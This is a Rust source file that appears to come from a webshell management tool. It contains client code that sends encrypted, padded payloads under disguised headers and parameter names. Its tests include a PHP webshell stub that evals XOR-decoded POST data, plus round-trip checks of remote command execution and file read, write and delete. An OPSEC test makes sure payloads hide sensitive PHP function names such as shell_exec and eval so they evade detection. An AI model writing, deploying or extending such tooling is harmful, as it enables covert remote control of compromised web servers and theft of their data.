/// NATIVE 编码器通道：POST formData（编码器加密的参数 JSON）+ 自定义头鉴权，
/// 响应为 JSON{data: 编码器密文}，解密后得到结果 JSON。
fn native_call(
    php: &PhpSession,
    action: &str,
    params: &[(&str, &str)],
    settings: &AppSettings,
) -> Result<Value, ProtocolError> {
    let mut request = serde_json::Map::new();
    request.insert("a".to_string(), Value::String(action.to_string()));
    for (key, value) in params {
        request.insert((*key).to_string(), Value::String((*value).to_string()));
    }
    native_call_json(php, action, &Value::Object(request).to_string(), settings)
}

/// NATIVE 通道的原始 JSON 调用（支持嵌套结构，如批量的 `ops` 数组）。
fn native_call_json(
    php: &PhpSession,
    action: &str,
    request: &str,
    settings: &AppSettings,
) -> Result<Value, ProtocolError> {
    // 传输压缩（gzip）：新 stub 走**明文层**信封 —— 压缩发生在加密之前，
    // 才能真正收回 base64 的 33% 膨胀；密文是高频熵数据，密文层压缩收益接近零。
    // 旧 stub（未上报 gzip_plain）保持既有行为：密文层压缩（v0.1.0 起的 stub 都会解压）。
    let gzip_plain = php
        .capabilities
        .as_ref()
        .map(|caps| caps.supports("gzip_plain"))
        .unwrap_or(false);
    let mut sent = request.to_string();
    if settings.gzip_enabled
        && gzip_plain
        && let Some(envelope) = gzip_plain_envelope(request)
    {
        sent = envelope;
    }
    let payload = encode_payload(php, &sent)?;
    // 密文层压缩只对旧 stub 有意义（新 stub 不上报 gzip，此项自然为 false）；
    // None（更旧的 stub 未上报）→ 保持 v1 行为，继续压缩
    let gzip_legacy_ok = php
        .capabilities
        .as_ref()
        .map(|caps| caps.supports("gzip"))
        .unwrap_or(true);
    let payload =
        crate::protocol::transport::gzip_payload(&payload, settings.gzip_enabled && gzip_legacy_ok);
    // base64 载荷可能含 +/=，必须转义（否则 PHP 表单解析时 + 转空格损坏密文）；
    // P2：手动快速转义（仅 +、=、&），避免对整块载荷全量百分号编码
    // W2：参数名/头名可配（必须与 stub 生成时一致），另支持查询串、额外头与随机填充
    let param = php.transport.param.as_deref().unwrap_or("formData");
    let header_name = php.transport.header.as_deref().unwrap_or("X-Debug-Key");
    let mut body = format!("{param}={}", form_escape(&payload));
    append_padding(&mut body, php.transport.padding);
    let token = auth_token(php);
    let started = std::time::Instant::now();
    let mut builder = php
        .client
        .post(php.transport.url(&php.endpoint))
        .header("Content-Type", "application/x-www-form-urlencoded")
        .header(header_name, &token);
    for (name, value) in &php.transport.extra_headers {
        builder = builder.header(name, value);
    }
    let response = match builder.body(body).send() {
        Ok(response) => response,
        Err(error) => {
            log_request(php, action, 0, started, request, "");
            return Err(ProtocolError::Network(error.to_string()));
        }
    };
    let status = response.status();
    if !status.is_success() {
        log_request(php, action, status.as_u16(), started, request, "");
        return Err(ProtocolError::HttpStatus(
            status.as_u16(),
            status.canonical_reason().unwrap_or("").to_string(),
        ));
    }
    let max_bytes = settings.max_file_size_mb.saturating_mul(1024 * 1024);
    let bytes = crate::protocol::transport::read_limited(response, max_bytes)
        .map_err(|error| ProtocolError::ParseError(error.to_string()))?;
    if bytes.len() > max_bytes as usize {
        return Err(ProtocolError::ParseError(format!(
            "响应超过大小上限（{}MB）",
            settings.max_file_size_mb
        )));
    }
    let text = String::from_utf8_lossy(&bytes);
    log_request(php, action, status.as_u16(), started, request, &text);
    let outer: Value = serde_json::from_str(&text)
        .map_err(|_| ProtocolError::ParseError("响应不是合法 JSON".to_string()))?;
    let data = outer
        .get("data")
        .and_then(|v| v.as_str())
        .ok_or_else(|| ProtocolError::ParseError("响应缺少 data 字段".to_string()))?;
    // gzip：响应若为 gzip 字节则解压后重新 base64（stub 端 gzencode 兜底）
    // 旧 stub：密文层压缩（先解压再解密）；新 stub：明文层压缩（先解密再解压）
    let data = crate::protocol::transport::gunzip_if_needed(data);
    let plain = decode_payload(php, &data)?;
    let plain = crate::protocol::transport::gunzip_bytes_if_needed(plain);
    let value: Value = serde_json::from_slice(&plain)
        .map_err(|_| ProtocolError::ParseError("响应内容不是合法 JSON".to_string()))?;
    if value.get("ok").and_then(|v| v.as_bool()) != Some(true) {
        let message = value
            .get("error")
            .and_then(|v| v.as_str())
            .unwrap_or("未知错误");
        return Err(ProtocolError::ServerError(message.to_string()));
    }
    Ok(value)
}

/// 是否 NATIVE 分发编码器。
fn is_native(php: &PhpSession) -> bool {
    php.encoder.id().starts_with("native")
}

/// 统一操作分发：NATIVE 走内置功能调用（无 init），其余走分阶段载荷。
fn dispatch(
    php: &PhpSession,
    action: &str,
    params: &[(&str, &str)],
    settings: &AppSettings,
) -> Result<Value, ProtocolError> {
    if is_native(php) {
        native_call(php, action, params, settings)
    } else {
        session_call(php, action, params, settings)
    }
}

/// 多路复用：一次往返执行多个逻辑调用，返回逐项结果。
///
/// 仅 NATIVE / 分阶段通道支持（stub 与处理器都有统一分发器）；
/// legacy 逐请求通道没有服务端分发器，调用方应先检查 `batch` 能力。
fn dispatch_batch(
    php: &PhpSession,
    ops: &[Value],
    settings: &AppSettings,
) -> Result<Vec<Value>, ProtocolError> {
    let request = serde_json::json!({ "a": "batch", "ops": ops });
    let value = if is_native(php) {
        native_call_json(php, "batch", &request.to_string(), settings)?
    } else {
        session_call_json(php, "batch", &request, settings)?
    };
    value
        .pointer("/data/results")
        .and_then(|item| item.as_array())
        .cloned()
        .ok_or_else(|| ProtocolError::ParseError("批量响应缺少 results".to_string()))
}

/// 把 `{ok, data:{entries}}` 形态的响应解析为目录列表（单次与批量共用）。
fn parse_dir_listing(value: &Value) -> Result<DirListing, ProtocolError> {
    if value.get("ok").and_then(|item| item.as_bool()) != Some(true) {
        let message = value
            .get("error")
            .and_then(|item| item.as_str())
            .unwrap_or("目录列举失败");
        return Err(ProtocolError::ServerError(message.to_string()));
    }
    Ok(DirListing {
        entries: parse_entries(value),
    })
}

/// 从 `/data/entries` 解析文件项（单次与批量共用）。
fn parse_entries(value: &Value) -> Vec<FileEntry> {
    value
        .pointer("/data/entries")
        .and_then(|item| item.as_array())
        .map(|array| {
            array
                .iter()
                .map(|item| FileEntry {
                    name: item
                        .get("name")
                        .and_then(|v| v.as_str())
                        .unwrap_or("")
                        .to_string(),
                    path: item
                        .get("path")
                        .and_then(|v| v.as_str())
                        .unwrap_or("")
                        .to_string(),
                    is_dir: item
                        .get("is_dir")
                        .and_then(|v| v.as_bool())
                        .unwrap_or(false),
                    size: item.get("size").and_then(|v| v.as_u64()).unwrap_or(0),
                    modified: item
                        .get("mtime")
                        .and_then(|v| v.as_i64())
                        .map(format_timestamp)
                        .unwrap_or_default(),
                    perms: item
                        .get("perms")
                        .and_then(|v| v.as_str())
                        .unwrap_or("")
                        .to_string(),
                })
                .collect()
        })
        .unwrap_or_default()
}

fn conn_json(connection: &DbConnection) -> String {
    serde_json::to_string(connection).unwrap_or_else(|_| "{}".to_string())
}

// ---------------------------------------------------------------------------
// 测试
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use std::io::{Read, Write};
    use std::net::TcpListener;

    use serde_json::json;

    use super::*;
    use dosword_sdk::FeaturePlugin;
    use dosword_sdk::domain::ShellProfile;
    use dosword_sdk::encoder::md5_hex;

    fn settings() -> AppSettings {
        AppSettings {
            http_enabled: true,
            default_timeout_secs: 5,
            proxy: None,
            max_file_size_mb: 32,
            chunk_size_mb: 4,
            allow_arbitrary_code: true,
            audit_retention_days: 90,
            gzip_enabled: true,
            tls_verify: false,
            allow_arbitrary_local_paths: false,
            ..AppSettings::default()
        }
    }

    fn profile(endpoint: &str) -> ShellProfile {
        ShellProfile {
            id: "test".into(),
            workspace_id: "ws".into(),
            name: "t".into(),
            endpoint: endpoint.into(),
            runtime: "php".into(),
            protocol_id: PHP_PROTOCOL_ID.into(),
            status: "unknown".into(),
            last_connected_at: None,
            created_at: "2026-01-01".into(),
            password: "secret".into(),
            protocol_params: "{}".into(),
            authorization_ack: true,
            tags: vec![],
        }
    }

    /// 起一个假 PHP 服务器：解析收到的 `k`/`x` 参数，把 (code, k) 通过 channel 上报，
    /// 从代码中提取 nonce，然后用传入的 `respond` 生成 JSON data 包裹进该 nonce 帧回送
    /// （模拟真实 stub 的 echo 行为）。若 `respond` 返回 `None`，则回送明文 AUTH_FAIL。
    #[allow(dead_code)] // 测试基础设施，保留供新增协议用例复用
    fn spawn_fake_server(
        respond: impl Fn(String, String) -> Option<Value> + Send + 'static,
    ) -> (String, std::sync::mpsc::Receiver<(String, String)>) {
        let listener = TcpListener::bind("127.0.0.1:0").unwrap();
        let addr = listener.local_addr().unwrap();
        let (tx, rx) = std::sync::mpsc::channel();
        std::thread::spawn(move || {
            for stream in listener.incoming() {
                let Ok(mut stream) = stream else { continue };
                let mut buf = Vec::new();
                let mut temp = [0u8; 8192];
                loop {
                    match stream.read(&mut temp) {
                        Ok(0) => break,
                        Ok(n) => {
                            buf.extend_from_slice(&temp[..n]);
                            if buf.windows(4).any(|w| w == b"\r\n\r\n") {
                                break;
                            }
                        }
                        Err(_) => break,
                    }
                }
                let request = String::from_utf8_lossy(&buf);
                let body_start = request
                    .find("\r\n\r\n")
                    .map(|i| i + 4)
                    .unwrap_or(request.len());
                let body = &request[body_start.min(request.len())..];

                let params: Vec<(String, String)> = url::form_urlencoded::parse(body.as_bytes())
                    .map(|(k, v)| (k.into_owned(), v.into_owned()))
                    .collect();
                // 支持标准参数（k/x）与业务伪装参数（token/data）
                let param = |name: &str| {
                    params
                        .iter()
                        .find(|(key, _)| key == name)
                        .map(|(_, v)| v.clone())
                        .unwrap_or_default()
                };
                let k = {
                    let k = param("k");
                    let token = param("token");
                    if !k.is_empty() { k } else { token }
                };
                let x = {
                    let x = param("x");
                    let data = param("data");
                    if !x.is_empty() {
                        x
                    } else if !data.is_empty() {
                        data
                    } else if !body.is_empty() {
                        // body 直传模式（php_stream）：整个请求体即载荷
                        body.to_string()
                    } else {
                        String::new()
                    }
                };
                let code = {
                    // 支持多种编码：裸 base64 / XOR / AES-128-ECB / CHAR / OBFUSCATE
                    // （CHAR/OBFUSCATE 不经 base64，stub 直接 eval，先检查原文）
                    if x.contains("array_map('chr',array(") {
                        let numbers = x.rsplit("array(").next().unwrap_or("");
                        let restored: Vec<u8> = numbers
                            .split(')')
                            .next()
                            .unwrap_or("")
                            .split(',')
                            .filter_map(|item| item.trim().parse::<u8>().ok())
                            .collect();
                        String::from_utf8_lossy(&restored).to_string()
                    } else if x.contains("strrev('") {
                        let reversed = x
                            .split("strrev('")
                            .nth(1)
                            .and_then(|part| part.split("')").next())
                            .unwrap_or("");
                        let b64: String = reversed.chars().rev().collect();
                        let restored = B64.decode(&b64).unwrap_or_default();
                        String::from_utf8_lossy(&restored).to_string()
                    } else {
                        let raw = B64.decode(&x).unwrap_or_default();
                        // 8 字节连续特征串，XOR/AES 密文命中概率可忽略
                        let is_plain = raw.windows(8).any(|w| w == b"@ini_set");
                        if is_plain {
                            String::from_utf8_lossy(&raw).to_string()
                        } else {
                            // XOR
                            let key = md5_hex("secret").into_bytes();
                            let mut restored: Vec<u8> = raw
                                .iter()
                                .enumerate()
                                .map(|(index, byte)| byte ^ key[index % key.len()])
                                .collect();
                            if !restored.windows(8).any(|w| w == b"@ini_set") {
                                // AES-128-ECB
                                restored = dosword_sdk::encoder::aes_ecb_decrypt(
                                    &raw,
                                    &dosword_sdk::encoder::aes_key("secret"),
                                )
                                .unwrap_or_default();
                            }
                            String::from_utf8_lossy(&restored).to_string()
                        }
                    }
                };
                let _ = tx.send((k.clone(), code.clone()));

                // 从代码中提取 `echo '{nonce}'` 帧标记
                let nonce = code
                    .split("echo '")
                    .nth(1)
                    .and_then(|part| part.split('\'').next())
                    .unwrap_or("abababab")
                    .to_string();

                let body = match respond(code, k) {
                    Some(data) => {
                        format!("{}{}{}", nonce, B64.encode(json!(data).to_string()), nonce)
                    }
                    None => "AUTH_FAIL".to_string(),
                };
                let response = format!(
                    "HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
                    body.len(),
                    body
                );
                let _ = stream.write_all(response.as_bytes());
                let _ = stream.flush();
            }
        });
        (format!("http://{addr}"), rx)
    }

    #[test]
    fn real_php_all_encoders_round_trip() {
        // 每个**已注册**编码器的生成 stub 都做真实执行验证。
        //
        // 历史缺口：本测试只遍历 6 个 native 变体，8 个 legacy 编码器
        // （base64 / xor_base64 / char / php_obfuscate / php_stream / xor_body /
        // xor_session / des）与 custom 从未做过端到端验证 —— 用户却能在生成器里
        // 选到它们。现在改为遍历注册表，并对每个编码器跑完整操作面
        // （命令 / 目录列举 / 整文件读写 / 偏移分块读写）。
        let encoder_ids: Vec<String> = dosword_sdk::EncoderRegistry::global()
            .list()
            .into_iter()
            .map(|(id, _)| id)
            .collect();
        assert!(
            encoder_ids.len() >= 16,
            "注册表应含全部编码器：{encoder_ids:?}"
        );
        // custom 编码器的 stub 由用户上传，客户端只规定**载荷编解码**
        // （base64(XOR(代码, md5(密码)))）与**表单参数名**（`k` = 密码，`x` = 载荷，
        // 经典蚁剑形态）；上传的 stub 必须同时满足这两点，否则会拿到
        // 401/AUTH_FAIL 或「响应中未找到协议帧」。这里用一份最小契约 stub 作模板。
        dosword_sdk::encoder::set_custom_stub(
            r#"<?php
@ini_set('display_errors','0');@error_reporting(0);
if(!isset($_POST['k'])||!isset($_POST['x'])){die('AUTH_FAIL');}
$key=md5($_POST['k']);
$raw=base64_decode($_POST['x']);
$code='';
for($i=0;$i<strlen($raw);$i++){$code.=$raw[$i]^$key[$i%strlen($key)];}
@eval($code);
"#,
        )
        .expect("注册 custom 测试模板");

        let settings = settings();
        for encoder_id in &encoder_ids {
            // DES-ECB 需要 OpenSSL legacy provider（OpenSSL 3 默认不加载）
            if encoder_id.contains("des") && !php_supports_des_ecb() {
                eprintln!("跳过 {encoder_id}：当前 php 的 OpenSSL 不支持 DES-ECB");
                continue;
            }
            let Some((url, dir, mut child)) = spawn_php_server_with(encoder_id, "secret", false)
            else {
                eprintln!("跳过 {encoder_id}：未检测到 php 可执行文件");
                continue;
            };
            let mut profile = profile(&url);
            profile.protocol_params = format!(r#"{{"encoder":"{encoder_id}"}}"#);
            let result = (|| -> Result<(), ProtocolError> {
                let (session, probe) = PhpProtocol.connect(&profile, &settings)?;
                assert_eq!(probe.status, "online", "{encoder_id} 探测失败");

                // 1) 命令执行
                let output =
                    PhpProtocol.execute_command(session.as_ref(), "printf enc-ok", &settings)?;
                assert_eq!(output.stdout.trim(), "enc-ok", "{encoder_id} 命令输出不符");

                // 2) 目录列举：验证 stat 合并后 perms/size/mtime 仍在
                //    （hello.txt 在文档根的子目录 www 下，顺带覆盖目录项）
                let listing = PhpProtocol.list_dir(
                    session.as_ref(),
                    &dir.join("www").display().to_string(),
                    &settings,
                )?;
                let hello = listing
                    .entries
                    .iter()
                    .find(|entry| entry.name == "hello.txt")
                    .unwrap_or_else(|| panic!("{encoder_id} 目录列举缺少 hello.txt"));
                assert!(!hello.is_dir, "{encoder_id} hello.txt 不应是目录");
                assert_eq!(
                    hello.size,
                    "hello dosword".len() as u64,
                    "{encoder_id} 文件大小不符"
                );
                assert!(
                    !hello.perms.is_empty(),
                    "{encoder_id} perms 为空（stat 合并丢字段）"
                );
                assert!(
                    !hello.modified.is_empty(),
                    "{encoder_id} mtime 为空（stat 合并丢字段）"
                );
                let parent = PhpProtocol.list_dir(
                    session.as_ref(),
                    &dir.display().to_string(),
                    &settings,
                )?;
                let www = parent
                    .entries
                    .iter()
                    .find(|entry| entry.name == "www")
                    .unwrap_or_else(|| panic!("{encoder_id} 目录列举缺少 www"));
                assert!(www.is_dir, "{encoder_id} www 应是目录");
                assert_eq!(www.size, 0, "{encoder_id} 目录 size 应为 0");
                assert!(!www.perms.is_empty(), "{encoder_id} 目录 perms 为空");

                // 3) 整文件写入 + 读回（含非 ASCII 与二进制字节）
                let payload: Vec<u8> = "第一段-utf8".bytes().chain([0u8, 255, 1, 2]).collect();
                let target = format!("{}/enc-{encoder_id}.bin", dir.display());
                PhpProtocol.write_file(session.as_ref(), &target, &payload, &settings)?;
                assert_eq!(
                    PhpProtocol.read_file(session.as_ref(), &target, &settings)?,
                    payload,
                    "{encoder_id} 整文件读写不一致"
                );

                // 4) 偏移分块读写（需要 stub 上报 ChunkedTransfer）
                let mut offset = 0u64;
                for chunk in [b"alpha".to_vec(), vec![0u8, 1, 254], b"omega".to_vec()] {
                    PhpProtocol.write_chunk(
                        session.as_ref(),
                        &target,
                        &chunk,
                        offset,
                        &settings,
                    )?;
                    offset += chunk.len() as u64;
                }
                let expected: Vec<u8> =
                    [b"alpha".to_vec(), vec![0u8, 1, 254], b"omega".to_vec()].concat();
                assert_eq!(
                    PhpProtocol.read_file(session.as_ref(), &target, &settings)?,
                    expected,
                    "{encoder_id} 顺序分块写入结果不符"
                );
                let slice = PhpProtocol.read_chunk(session.as_ref(), &target, 2, 5, &settings)?;
                assert_eq!(slice, expected[2..7].to_vec(), "{encoder_id} 偏移读取不符");
                Ok(())
            })();
            let _ = child.kill();
            let _ = child.wait();
            if let Err(error) = result {
                let _ = std::fs::copy(
                    dir.join("shell.php"),
                    std::env::temp_dir().join(format!("failed_{encoder_id}.php")),
                );
                let _ = std::fs::remove_dir_all(&dir);
                panic!("{encoder_id} 真实执行应成功：{error}");
            }
            let _ = std::fs::remove_dir_all(&dir);
        }
    }

    /// 回归：分块读取/写入必须走内置功能分发（NATIVE/分阶段通道），
    /// 且目标 stub 必须上报 ChunkedTransfer 能力。
    ///
    /// 历史缺陷：read_chunk/write_chunk 缺少 is_session 分支，默认编码器下
    /// 上传/下载 100% 失败；且没有能力标记时旧 stub 会忽略偏移 →
    /// 下载无限追加、上传从头覆写。
    #[test]
    fn real_php_chunked_transfer_round_trip() {
        let settings = settings();
        for (encoder_id, session) in [("native", false), ("native", true)] {
            let Some((url, dir, mut child)) = spawn_php_server_with(encoder_id, "secret", session)
            else {
                eprintln!(
                    "跳过分块传输（{encoder_id} session={session}）：未检测到 php 可执行文件"
                );
                continue;
            };
            let mut profile = profile(&url);
            profile.protocol_params =
                format!(r#"{{"encoder":"{encoder_id}","session":{session}}}"#);
            let result = (|| -> Result<(), ProtocolError> {
                let (session_state, _) = PhpProtocol.connect(&profile, &settings)?;
                let php = session_state
                    .as_any()
                    .downcast_ref::<PhpSession>()
                    .ok_or_else(|| ProtocolError::SessionInvalid("会话类型不匹配".into()))?;
                assert!(php.chunked, "stub 应上报 ChunkedTransfer 能力");
                // 三块顺序写入（含非 ASCII 与二进制字节）
                // 目标路径必须落在 php -S 的服务目录里：写根目录（如 /chunked.bin）
                // 会因权限被拒，属于测试自身的环境错误而非协议问题
                let remote = format!("{}/chunked.bin", dir.display());
                let chunks: [Vec<u8>; 3] = [
                    "第一块数据".as_bytes().to_vec(),
                    vec![0u8, 1, 2, 255, 254, 253],
                    "third-chunk".as_bytes().to_vec(),
                ];
                let mut offset = 0u64;
                for chunk in &chunks {
                    PhpProtocol.write_chunk(
                        session_state.as_ref(),
                        &remote,
                        chunk,
                        offset,
                        &settings,
                    )?;
                    offset += chunk.len() as u64;
                }
                let expected: Vec<u8> = chunks.concat();
                let whole = PhpProtocol.read_file(session_state.as_ref(), &remote, &settings)?;
                assert_eq!(whole, expected, "整文件内容应一致");

                // 偏移 + 长度切片
                let slice =
                    PhpProtocol.read_chunk(session_state.as_ref(), &remote, 4, 6, &settings)?;
                assert_eq!(slice, expected[4..10].to_vec(), "偏移读取内容应一致");
                // length=0 表示读到文件尾
                let tail = PhpProtocol.read_chunk(
                    session_state.as_ref(),
                    &remote,
                    (expected.len() - 4) as u64,
                    0,
                    &settings,
                )?;
                assert_eq!(tail, expected[expected.len() - 4..].to_vec());
                // 越界偏移返回空（EOF 信号），不得报错
                let eof = PhpProtocol.read_chunk(
                    session_state.as_ref(),
                    &remote,
                    expected.len() as u64,
                    16,
                    &settings,
                )?;
                assert!(eof.is_empty(), "文件末尾之后应返回空块");
                Ok(())
            })();
            let _ = child.kill();
            let _ = child.wait();
            let _ = std::fs::remove_dir_all(&dir);
            if let Err(error) = result {
                panic!("分块传输往返失败（{encoder_id} session={session}）：{error}");
            }
        }
    }

    /// gzip：分阶段载荷在**明文层**压缩（`{"n":..,"z":1,"d":base64(gzip(请求))}`），
    /// 大载荷必须能往返；同时验证关闭 gzip 时同一条通道仍然可用（非信封路径）。
    ///
    /// 用 8KB 高度可压缩内容：gzip 必然比原文小，因此压缩分支一定被走到
    /// （`gzip_payload` 在无收益时会退回原文）。响应方向同理（帧内容 > 512 字节
    /// 时处理器才压缩），客户端按 gzip 魔数识别。
    #[test]
    fn real_php_session_gzip_round_trip() {
        for gzip_enabled in [true, false] {
            let mut settings = settings();
            settings.gzip_enabled = gzip_enabled;
            let Some((url, dir, mut child)) = spawn_php_server_with("xor_session", "secret", false)
            else {
                eprintln!("跳过：未检测到 php 可执行文件");
                return;
            };
            let mut profile = profile(&url);
            profile.protocol_params = r#"{"encoder":"xor_session"}"#.to_string();
            let result = (|| -> Result<(), ProtocolError> {
                let (session, _) = PhpProtocol.connect(&profile, &settings)?;
                let payload = "A".repeat(8 * 1024).into_bytes();
                let target = format!("{}/gzip-{gzip_enabled}.bin", dir.display());
                PhpProtocol.write_chunk(session.as_ref(), &target, &payload, 0, &settings)?;
                let read = PhpProtocol.read_chunk(
                    session.as_ref(),
                    &target,
                    0,
                    payload.len() as u64,
                    &settings,
                )?;
                assert_eq!(read, payload, "gzip={gzip_enabled} 往返不一致");
                Ok(())
            })();
            let _ = child.kill();
            let _ = child.wait();
            let _ = std::fs::remove_dir_all(&dir);
            result
                .unwrap_or_else(|error| panic!("分阶段载荷 gzip={gzip_enabled} 往返失败：{error}"));
        }
    }

    /// OPSEC：legacy 通道的**逐请求代码**里不应出现敏感函数名。
    ///
    /// 这些代码是每次请求下发的（base64 / char / php_obfuscate 等编码器下
    /// 只是编码而非加密，载荷可被直接查看），因此与分阶段处理器一样走
    /// 运行时 crc32b 符号表。这里用请求调试环缓冲拿到真实载荷并断言。
    #[test]
    fn legacy_channel_payloads_have_no_plain_sensitive_names() {
        let settings = settings();
        let Some((url, dir, mut child)) = spawn_php_server_with("base64", "secret", false) else {
            eprintln!("跳过：未检测到 php 可执行文件");
            return;
        };
        let mut profile = profile(&url);
        profile.protocol_params = r#"{"encoder":"base64"}"#.to_string();
        let target = format!("{}/opsec.txt", dir.display());
        let result = (|| -> Result<(), ProtocolError> {
            let (session, _) = PhpProtocol.connect(&profile, &settings)?;
            PhpProtocol.execute_command(session.as_ref(), "printf opsec", &settings)?;
            PhpProtocol.list_dir(session.as_ref(), &dir.display().to_string(), &settings)?;
            PhpProtocol.write_file(session.as_ref(), &target, b"x", &settings)?;
            PhpProtocol.read_file(session.as_ref(), &target, &settings)?;
            PhpProtocol.read_chunk(session.as_ref(), &target, 0, 1, &settings)?;
            PhpProtocol.write_chunk(session.as_ref(), &target, b"y", 1, &settings)?;
            PhpProtocol.touch_path(session.as_ref(), &target, 1_700_000_000, &settings)?;
            PhpProtocol.delete_path(session.as_ref(), &target, &settings)?;
            PhpProtocol.create_dir(
                session.as_ref(),
                &format!("{}/opsec-dir", dir.display()),
                &settings,
            )?;
            Ok(())
        })();
        let records = crate::protocol::reqlog::list_requests(Some(&url), None);
        let _ = child.kill();
        let _ = child.wait();
        let _ = std::fs::remove_dir_all(&dir);
        result.unwrap_or_else(|error| panic!("legacy 通道操作失败：{error}"));
        assert!(
            records.len() >= 8,
            "请求调试应记录全部操作：{}",
            records.len()
        );
        for record in records {
            for token in [
                "shell_exec",
                "passthru",
                "popen",
                "base64_decode",
                "base64_encode",
                "file_get_contents",
                "file_put_contents",
                "scandir",
                "unlink",
                "rmdir",
                "rename(",
                "stream_socket_client",
                "fwrite",
                "fgets",
                "fread",
                "preg_split",
                "gzdecode",
                "gzencode",
                "eval(",
            ] {
                assert!(
                    !record.payload.contains(token),
                    "{} 载荷含明文 {token}：{}",
                    record.action,
                    record.payload
                );
            }
        }
    }

    /// W4 心跳：三条通道都能轻量探活；目标下线后必须报错（stale 的依据）。
    #[test]
    fn real_php_heartbeat_round_trip() {
        let settings = settings();
        for encoder_id in ["native", "xor_session", "base64"] {
            let Some((url, dir, mut child)) = spawn_php_server_with(encoder_id, "secret", false)
            else {
                eprintln!("跳过：未检测到 php 可执行文件");
                return;
            };
            let mut profile = profile(&url);
            profile.protocol_params = format!(r#"{{"encoder":"{encoder_id}"}}"#);
            let (session, _) = PhpProtocol
                .connect(&profile, &settings)
                .unwrap_or_else(|error| panic!("{encoder_id} 连接失败：{error}"));
            // 在线：心跳成功
            PhpProtocol
                .heartbeat(session.as_ref(), &settings)
                .unwrap_or_else(|error| panic!("{encoder_id} 心跳失败：{error}"));
            // 目标下线：心跳必须失败（会话层据此标记 stale）
            let _ = child.kill();
            let _ = child.wait();
            let error = PhpProtocol
                .heartbeat(session.as_ref(), &settings)
                .expect_err("目标下线后心跳必须失败");
            assert!(!error.to_string().is_empty());
            let _ = std::fs::remove_dir_all(&dir);
        }
    }

    /// W4 多路复用：一次往返列举多个目录（NATIVE / 分阶段通道）。
    ///
    /// 逐目录容错：不存在的目录只让该项失败，其余照常返回。
    /// legacy 逐请求通道没有服务端分发器 → 必须明确 `NotSupported`（命令层据此回退）。
    #[test]
    fn real_php_batch_list_dir_round_trip() {
        let settings = settings();
        for encoder_id in ["native", "xor_session"] {
            let Some((url, dir, mut child)) = spawn_php_server_with(encoder_id, "secret", false)
            else {
                eprintln!("跳过：未检测到 php 可执行文件");
                return;
            };
            let mut profile = profile(&url);
            profile.protocol_params = format!(r#"{{"encoder":"{encoder_id}"}}"#);
            let result = (|| -> Result<(), ProtocolError> {
                let (session, probe) = PhpProtocol.connect(&profile, &settings)?;
                assert!(
                    probe
                        .capabilities
                        .as_ref()
                        .is_some_and(|caps| caps.supports("batch")),
                    "{encoder_id} 应上报 batch 能力：{:?}",
                    probe.capabilities
                );
                let paths = vec![
                    dir.display().to_string(),
                    dir.join("www").display().to_string(),
                    format!("{}/missing", dir.display()),
                ];
                let results = PhpProtocol.batch_list_dir(session.as_ref(), &paths, &settings)?;
                assert_eq!(results.len(), 3, "{encoder_id} 批量结果条数不符");
                assert!(results[0].1.is_ok(), "{encoder_id} 根目录应成功");
                let www = results[1]
                    .1
                    .as_ref()
                    .map_err(|error| ProtocolError::ParseError(error.clone()))?;
                assert!(
                    www.entries.iter().any(|entry| entry.name == "hello.txt"),
                    "{encoder_id} 批量结果缺少 hello.txt"
                );
                assert!(results[2].1.is_err(), "{encoder_id} 不存在的目录应单项失败");
                Ok(())
            })();
            let _ = child.kill();
            let _ = child.wait();
            let _ = std::fs::remove_dir_all(&dir);
            result.unwrap_or_else(|error| panic!("{encoder_id} 批量列举失败：{error}"));
        }

        // legacy 通道：明确不支持（无服务端分发器）
        let Some((url, dir, mut child)) = spawn_php_server_with("base64", "secret", false) else {
            return;
        };
        let mut profile = profile(&url);
        profile.protocol_params = r#"{"encoder":"base64"}"#.to_string();
        let (session, _) = PhpProtocol
            .connect(&profile, &settings)
            .expect("legacy 连接");
        let error = PhpProtocol
            .batch_list_dir(session.as_ref(), &[dir.display().to_string()], &settings)
            .expect_err("legacy 通道不应支持批量");
        assert!(matches!(error, ProtocolError::NotSupported(_)), "{error}");
        let _ = child.kill();
        let _ = child.wait();
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// W2：传输形态配置的校验（非法值必须拒绝，尤其是请求头注入）。
    #[test]
    fn transport_profile_validation() {
        for params in [
            r#"{"transport":{"param":"bad-name"}}"#,
            r#"{"transport":{"param":"1abc"}}"#,
            r#"{"transport":{"header":"X\r\nInjected: 1"}}"#,
            r#"{"transport":{"extraHeaders":{"X-Ok":"a\r\nb"}}}"#,
            r#"{"transport":{"pathSuffix":"v=1"}}"#,
            r#"{"transport":{"pathSuffix":"?a b"}}"#,
            r#"{"transport":{"pathSuffix":"?a#b"}}"#,
            r#"{"transport":{"padding":99999}}"#,
            r#"{"transport":[]}"#,
            r#"{"transport":{"extraHeaders":[]}}"#,
        ] {
            assert!(
                TransportProfile::from_protocol_params(params).is_err(),
                "应拒绝非法传输形态：{params}"
            );
        }
        let ok = TransportProfile::from_protocol_params(
            r#"{"transport":{"param":"sess","header":"X-Token","pathSuffix":"?v=1","padding":8,"extraHeaders":{"X-A":"1"}}}"#,
        )
        .expect("合法配置");
        assert_eq!(ok.param.as_deref(), Some("sess"));
        assert_eq!(ok.header.as_deref(), Some("X-Token"));
        assert_eq!(ok.extra_headers, vec![("X-A".to_string(), "1".to_string())]);
        assert_eq!(ok.url("http://x/shell.php"), "http://x/shell.php?v=1");
        // 缺省 = 历史行为
        let default = TransportProfile::from_protocol_params("{}").expect("默认");
        assert!(default.param.is_none() && default.header.is_none());
        assert_eq!(default.url("http://x"), "http://x");
    }

    /// W2：自定义参数名 + 鉴权头名必须与 stub 一致才能连通。
    ///
    /// 用 `stub_with` 生成 `sess` / `X-Token` 的 stub：匹配的配置应成功；
    /// 用默认参数名/头名连接必须失败 —— 证明这两个值真的被 stub 使用，
    /// 而不是客户端单方面"配置成功"。
    #[test]
    fn real_php_transport_profile_round_trip() {
        use dosword_sdk::encoder::StubOptions;
        let settings = settings();
        let opts = StubOptions {
            param: "sess".into(),
            header: "X-Token".into(),
        };
        let encoder = dosword_sdk::EncoderRegistry::global()
            .get("native")
            .expect("native 编码器");
        let stub = encoder
            .stub_with("php", "secret", &opts)
            .expect("生成自定义传输形态 stub");
        let Some((url, dir, mut child)) = spawn_php_server_stub(&stub, "native", false) else {
            eprintln!("跳过：未检测到 php 可执行文件");
            return;
        };
        let result = (|| -> Result<(), ProtocolError> {
            // 1) 匹配的传输形态（含查询串 / 额外头 / 填充）：应成功
            let mut profile = profile(&url);
